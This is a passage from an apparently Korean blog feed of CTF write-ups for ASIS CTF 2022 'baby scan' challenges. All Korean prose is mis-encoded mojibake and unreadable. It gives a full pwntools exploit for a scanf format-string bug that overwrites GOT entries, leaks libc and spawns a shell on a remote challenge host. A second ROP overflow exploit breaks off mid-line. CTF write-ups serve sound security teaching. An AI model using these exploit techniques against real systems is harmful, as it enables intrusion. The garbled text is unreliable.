ì •ì˜í•œë‹¤. <em>&lt;â€“í¬ë§·ìŠ¤íŠ¸ë§ì„ ì–´ì°Œì–´ì°Œ ìž˜ ì •ì˜í•´ì„œ</em></p></li><li><p>í• ë‹¹í•œ íž™ì— <code>scanf</code>ë¥¼ ì´ìš©í•˜ì—¬ ìž…ë ¥ì„ ì§„í–‰í•œë‹¤. <em>&lt;â€“fsbë¥¼ íŠ¸ë¦¬ê±°í•´ì„œ ì›í•˜ëŠ” ìœ„ì¹˜ì— ì›í•˜ëŠ” ê°’ì„ ì ì„ ìˆ˜ ìžˆë‹¤.</em></p></li></ol><p>ì–´ë–»ê²Œ fsbë¥¼ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìžˆì„ê¹Œ? <code>baby sacn 1</code>ì„ í’€ì—ˆë˜ ê²ƒì²˜ëŸ¼ <code>0</code>ì„ ìž…ë ¥í•´ì„œ ìŠ¤íƒì„ ì‚´íŽ´ë³´ë©° ìƒê°í•´ë³´ìž.</p><p>4ë²ˆì§¸ ê³¼ì •ì„ ì§„í–‰í•  ë•Œ ì¦‰, <code>scanf</code>ë¥¼ ì´ìš©í•˜ì—¬ ìž…ë ¥ì„ ì§„í–‰í•  ë•Œ argumentsëŠ” ì•„ëž˜ì™€ ê°™ë‹¤. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf@plt (</span><br><span class="line">   $rdi = 0x007ffcdabcf878 â†’ 0x00000000733025 (&quot;%0s&quot;?),</span><br><span class="line">   $rsi = 0x0000000172a2a0 â†’ 0x0000000000000000,</span><br><span class="line">   $rdx = 0x0000000172a2a0 â†’ 0x0000000000000000</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>ì²« ë²ˆì§¸ ì¸ìžì— ì£¼ëª©í•´ì„œ ìƒê°ì„ í•´ë³´ìž. ìš°ë¦¬ëŠ” í¬ë§·ìŠ¤íŠ¸ë§ì„ ë§ˆìŒëŒ€ë¡œ ì§‘ì–´ë„£ì–´ì„œ ìž…ë ¥í•  ìˆ˜ ìžˆë‹¤. <code>printf</code> í•¨ìˆ˜ì—ì„œ í¬ë§·ìŠ¤íŠ¸ë§ì„ ì •ì˜í•´ì£¼ì§€ ì•Šê³  ìš°ë¦¬ì˜ ìž…ë ¥ê°’ë§Œ ì¸ìžë¡œ ë“¤ì–´ê°„ë‹¤ë©´ fsbë¥¼ ì´ìš©í•´ì„œ ìŠ¤íƒì„ leakí•˜ê±°ë‚˜ ìŠ¤íƒì— ì›í•˜ëŠ” ê°’ì„ ë„£ì„ ìˆ˜ ìžˆë‹¤.</p><p><code>scanf</code>ì—ì„œë„ ë˜‘ê°™ì´ í†µí•˜ì§€ ì•Šì„ê¹Œ? í‚¤ë³´ë“œë¡œë¶€í„° ìž…ë ¥ì„ ë°›ëŠ” í•¨ìˆ˜ë‹ˆê¹ ì¶œë ¥ì€ í•˜ì§€ ëª»í•˜ë”ë¼ë„ ì›í•˜ëŠ” ìŠ¤íƒ ì£¼ì†Œì— ì›í•˜ëŠ” ê°’ì„ ì ì„ ìˆ˜ ìžˆì§€ ì•Šì„ê¹Œ?</p><p>sizeë¥¼ ìž…ë ¥ ë°›ì„ ë•Œ 15ê¸€ìžë¥¼ ìž…ë ¥í•  ìˆ˜ ìžˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scanf(&quot;%15s&quot;, size)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; x/20gx $rsp</span><br><span class="line">0x7ffcdabcf870:0x00007fab4b8902e80x0000000000733025</span><br><span class="line">0x7ffcdabcf880:0x00000000000000300x0000000000401170 &lt;-- [!]</span><br><span class="line">0x7ffcdabcf890:0x00007ffcdabcf9900x000000000172a2a0</span><br><span class="line">0x7ffcdabcf8a0:0x00000000000000000x00007fab4b6c3083</span><br><span class="line">0x7ffcdabcf8b0:0x00000001000000180x00007ffcdabcf998</span><br><span class="line">0x7ffcdabcf8c0:0x000000014b8877a00x0000000000401256</span><br><span class="line">0x7ffcdabcf8d0:0x00000000004013900x03f4474d8e43ddf7</span><br><span class="line">0x7ffcdabcf8e0:0x00000000004011700x00007ffcdabcf990</span><br><span class="line">0x7ffcdabcf8f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x7ffcdabcf900:0xfc0df2347f23ddf70xfca2d195ee2dddf7</span><br></pre></td></tr></table></figure><p>sizeë¥¼ ìž…ë ¥í•  ë•Œ 9ë²ˆì§¸ offsetì„ ì»¨íŠ¸ë¡¤í•  ìˆ˜ ìžˆë‹¤. í˜„ìž¬ëŠ” <code>0x401170</code>ì´ ì“°ì—¬ìžˆëŠ”ë°, ì´ê±° ëŒ€ì‹  ì›í•˜ëŠ” got ë„£ì„ ìˆ˜ ìžˆë‹¤ë©´?</p><p>ìžìž, <em>ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±° í•˜ê¸° ìœ„í•´ì„œ ìš°ë¦¬ê°€ ì•Œê³  ìžˆëŠ” ì •ë³´</em>ë¥¼ ì •ë¦¬í•´ë³´ìž. </p><ol><li><p><code>scanf(fmt, buf)</code>ì—ì„œ fsbë¥¼ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìžˆì„ ê²ƒë§Œ ê°™ë‹¤.</p></li><li><p>9ë²ˆì§¸ offsetì— ìž…ë ¥í•  ìˆ˜ ìžˆë‹¤. ì–¸ì œ? <code>scanf(&quot;%15s&quot;, size)</code>ì—ì„œ.</p></li><li><p><code>fmt</code>ëŠ” <code>%&lt;ì¸í’‹&gt;s</code>ì´ë‹¤.</p></li></ol><p>&#x3D;&gt; <code>data</code>ë¥¼ ìž…ë ¥í•  ë•Œ <code>scanf(&quot;%9$s&quot;, buf)</code>ê°€ ë˜ì–´ ì›í•˜ëŠ” ì£¼ì†Œì— ì›í•˜ëŠ” ê°’ì„ ì“¸ ìˆ˜ ìžˆì„ ê²ƒì´ë‹¤. got overwritingì´ ê°€ëŠ¥í•  ê²ƒì´ë‹¤.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>ìµìŠ¤ë¥¼ ìœ„í•´ idaì—ì„œë„ ì‚´íŽ´ë³´ìž.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> fmt[<span class="number">8</span>]; <span class="comment">// [rsp+8h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%15s&quot;</span>, nptr);</span><br><span class="line">  <span class="keyword">if</span> ( ((*__ctype_b_loc())[nptr[<span class="number">0</span>]] &amp; <span class="number">0x800</span>) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] Invalid number&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = atoi(nptr);</span><br><span class="line">  v6 = <span class="built_in">malloc</span>(v3 + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;data: &quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(fmt, <span class="number">8uLL</span>, <span class="string">&quot;%%%ss&quot;</span>, nptr);</span><br><span class="line">  __isoc99_scanf(fmt, v6);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ìš°ë¦¬ëŠ” í˜„ìž¬ íŠ¹ì • í•¨ìˆ˜ì˜ gotë¥¼ ë®ì„ ìˆ˜ ìžˆëŠ”ë°, <code>atoi</code> í•¨ìˆ˜ê°€ ì •ë§ì •ë§ ë„ˆë¬´ë„ˆë¬´ ì´ê²ƒì €ê²ƒí•˜ê¸°ì— ì ë‹¹í•´ ë³´ì¸ë‹¤. (ì¸ìžë¥¼ í•˜ë‚˜ë§Œ ë°›ì•„ì„œ..)</p><h3 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h3><p>ì²˜ìŒì— leakí•  ë•Œ <code>atoi@got</code>ë¥¼ <code>puts</code>ë¡œ ë®ì–´ì„œ ë¦­í•˜ë ¤ê³  í–ˆì—ˆë‹¤. ë§¤ìš°ë§¤ìš°ë§¤ìš°ë§¤ìš°ë§¤ìš° ë°”ë³´ê°™ì€ ìƒê°ì´ì—ˆë‹¤. leakí•˜ê³  ì‹¶ì€ ì£¼ì†Œë¥¼ ë„£ì–´ì£¼ë©´ ê³ ëŒ€ë¡œ ì¶œë ¥í•´ì¤€ë‹¤. (â€¦)</p><p>leakí•  ë•Œë„ fsbë¥¼ ì´ìš©í•´ì•¼ í•œë‹¤. ê·¸ëž˜ì„œ <code>atoi@got</code>ì„ <code>printf</code>ë¡œ ë®ê³ , <code>ntpr</code>ì— í¬ë§·ìŠ¤íŠ¸ë§ì„ ë„£ì–´ì¤˜ì•¼ í•œë‹¤.</p><h3 id="isdigit-bypass"><a href="#isdigit-bypass" class="headerlink" title="isdigit() bypass"></a><code>isdigit()</code> bypass</h3><p>prototypeì€ ì•„ëž˜ì™€ ê°™ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">isdigit</span><span class="params">( <span class="type">int</span> arg )</span>;</span><br></pre></td></tr></table></figure><p>parameterë¡œëŠ” <code>char</code>ê°€ ë“¤ì–´ê°€ì•¼ í•œë‹¤. â€˜0â€™ ~ â€˜9â€™ ì˜ ê°’ë§Œ ë“¤ì–´ê°ˆ ìˆ˜ ìžˆëŠ”ë°, ì´ ë¬¸ì œì—ì„œì„œëŠ” 15ê¸€ìžë¥¼ ì¸ìžë¡œ ì¤„ ìˆ˜ ìžˆë‹¤.<br>ë”°ë¼ì„œ <code>0&lt;ìž…ë ¥&gt;</code> ì´ëŸ°ì‹ìœ¼ë¡œ ì²« ê¸€ìžì— ìˆ«ìž í•˜ë‚˜ë¥¼ ì£¼ê³  ë’¤ì— ì›í•˜ëŠ” ë¬¸ìžë“¤ì„ ì¨ì„œ ì´ ê²€ì‚¬ë¥¼ ìš°íšŒí•  ìˆ˜ ìžˆë‹¤.</p><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><ol><li><code>exit@got</code>ë¥¼ <code>main</code> ì£¼ì†Œë¡œ ë®ì–´ ë¬´í•œížˆ ì‹¤í–‰ë˜ê²Œ í•˜ê¸°</li><li><code>atoi@got</code>ë¥¼ <code>printf</code> ì£¼ì†Œë¡œ ë®ì–´ leakí•  ìˆ˜ ìžˆê²Œ êµ¬ì„±í•˜ê¸°</li><li><code>0%29$p</code>ë¥¼ ë³´ë‚´ì„œ <code>__libc_start_main - 243</code> leak</li><li><code>system</code> ì‹¤ì œ ì£¼ì†Œë¥¼ êµ¬í•œ í›„ <code>atoi@got</code>ì„ ë®ê¸°</li><li>ë§ˆì§€ë§‰ìœ¼ë¡œ <code>0;sh</code>ë¥¼ ë³´ë‚´ shell íšë“</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pchall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;65.21.255.31&#x27;</span>, <span class="number">33710</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./pchall&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./../lib/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># exit@got -&gt; main</span></span><br><span class="line">payload = <span class="string">b&#x27;9$&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(e.got[<span class="string">&#x27;exit&#x27;</span>])[:-<span class="number">1</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = p64(e.symbols[&#x27;main&#x27;])</span></span><br><span class="line">payload = p64(e.symbols[<span class="string">&#x27;main&#x27;</span>])[<span class="number">0</span>:<span class="number">7</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># atoi@got -&gt; puts</span></span><br><span class="line">payload = <span class="string">b&#x27;9$&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(e.got[<span class="string">&#x27;atoi&#x27;</span>])[:-<span class="number">1</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = p64(e.symbols[<span class="string">&#x27;printf&#x27;</span>])[<span class="number">0</span>:<span class="number">7</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">payload = <span class="string">b&#x27;0%29$p&#x27;</span><span class="comment">#b&#x27;9$&#x27;.ljust(8, b&#x27;\x00&#x27;) + p64(e.got[&#x27;atoi&#x27;])[:-1]</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;00x&#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(<span class="string">b&#x27;0x&#x27;</span> + p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libc_base = leak - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">243</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># atoi@got -&gt; system</span></span><br><span class="line">payload = <span class="string">b&#x27;9$&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(e.got[<span class="string">&#x27;atoi&#x27;</span>])[:-<span class="number">1</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = p64(libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>])[<span class="number">0</span>:<span class="number">7</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="string">&#x27;0;sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="data-ë³´ë‚¼-ë•Œ-0-7-ë¡œ-ìžë¥¸-ì´ìœ "><a href="#data-ë³´ë‚¼-ë•Œ-0-7-ë¡œ-ìžë¥¸-ì´ìœ " class="headerlink" title="data ë³´ë‚¼ ë•Œ [0:7]ë¡œ ìžë¥¸ ì´ìœ ?"></a><code>data</code> ë³´ë‚¼ ë•Œ <code>[0:7]</code>ë¡œ ìžë¥¸ ì´ìœ ?</h3><p><code>scanf</code> í•¨ìˆ˜ëŠ” ìž…ë ¥í•  ë•Œ ë§ˆì§€ë§‰ì— Null byteë¥¼ ì‚½ìž…í•œë‹¤.<br><code>p64()</code>ë¡œ íŒ¨í‚¹í•´ì„œ ë³´ë‚´ê²Œ ë˜ë©´ 8ë°”ì´íŠ¸ë¥¼ ì „ì†¡í•˜ê²Œ ëœë‹¤. ì´ë•Œ <code>scanf</code>ë¡œ ìž…ë ¥ì„ ë°›ì•˜ê¸° ë•Œë¬¸ì— ë§ˆì§€ë§‰ì— Null byteê°€ ì¶”ê°€ë˜ì–´ <code>_ctype_b_loc@got.plt</code>ë¥¼ ë”ëŸ½í˜€ë²„ë ¸ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; x/2gx 0x0000000000404058</span><br><span class="line">0x404058 &lt;exit@got.plt&gt;:0x00000000004012560x00007fba7666d400</span><br><span class="line">gef&gt; x/gx 0x0000000000404058 + 0x8</span><br><span class="line">0x404060 &lt;__ctype_b_loc@got.plt&gt;:0x00007fba7666d400</span><br><span class="line">gef&gt; x/gx 0x00007fba7666d400</span><br><span class="line">0x7fba7666d400 &lt;isspace_l+16&gt;:0x66c3c0b70f200025</span><br></pre></td></tr></table></figure><p>ì•„ëž˜ê°€ ì˜¬ë°”ë¥¸ ê²½ìš°ì´ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; x/2gx 0x0000000000404058</span><br><span class="line">0x404058 &lt;exit@got.plt&gt;:0x00000000004012560x00007fdc030534a0</span><br><span class="line">gef&gt; x/gx 0x0000000000404058 + 0x8</span><br><span class="line">0x404060 &lt;__ctype_b_loc@got.plt&gt;:0x00007fdc030534a0</span><br><span class="line">gef&gt; x/gx 0x00007fdc030534a0</span><br><span class="line">0x7fdc030534a0 &lt;__ctype_b_loc&gt;:0x5d058b48fa1e0ff3</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ASIS&#123;fd408e00d5824d7220c4d624f894144e&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> ASIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
            <tag> scanf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASIS CTF 2022 - baby scan 1</title>
      <link href="/221017-asisctf2022-babysacn_1/"/>
      <url>/221017-asisctf2022-babysacn_1/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(87&#x2F;532) solves</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>Is it possible to scan the thousands of resulting strings by hand? We think itâ€™s tedious, but will get the job done!</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">â”œâ”€â”€ bin</span><br><span class="line">â”‚Â Â  â””â”€â”€ chall</span><br><span class="line">â”œâ”€â”€ lib</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ ld-2.31.so</span><br><span class="line">â”‚Â Â  â””â”€â”€ libc.so.6</span><br><span class="line">â”œâ”€â”€ run.sh</span><br><span class="line">â””â”€â”€ src</span><br><span class="line">    â””â”€â”€ main.c</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> size[<span class="number">16</span>], fmt[<span class="number">8</span>], *buf;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%15s&quot;</span>, size);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">isdigit</span>(*size)) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] Invalid number&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  buf = (<span class="type">char</span>*)alloca(atoi(size) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;data: &quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(fmt, <span class="keyword">sizeof</span>(fmt), <span class="string">&quot;%%%ss&quot;</span>, size);</span><br><span class="line">  <span class="built_in">scanf</span>(fmt, buf);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((constructor))</span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">  alarm(<span class="number">180</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>alloca</code> í•¨ìˆ˜ëŠ” ìŠ¤íƒì— ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹í•˜ëŠ” í•¨ìˆ˜ì´ë‹¤.</p><h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><p>í¬ë§·ìŠ¤íŠ¸ë§ ì¸ìžë¥¼ ë§ˆìŒëŒ€ë¡œ ì¤„ ìˆ˜ ìžˆìœ¼ë‹ˆ ìž…ë ¥ìœ¼ë¡œ 0ì„ ë„£ìœ¼ë©´ stack overflowë¥¼ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìžˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%0s&quot;</span>, buf);</span><br></pre></td></tr></table></figure><p>same as</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br></pre></td></tr></table></figure><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><ol><li><code>%0s</code> í¬ë§·ìŠ¤íŠ¸ë§ìœ¼ë¡œ overflow íŠ¸ë¦¬ê±°</li><li>ì›ê°€ì ¯</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;65.21.255.31&#x27;</span>, <span class="number">13370</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./../lib/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401433</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">72</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(e.symbols[<span 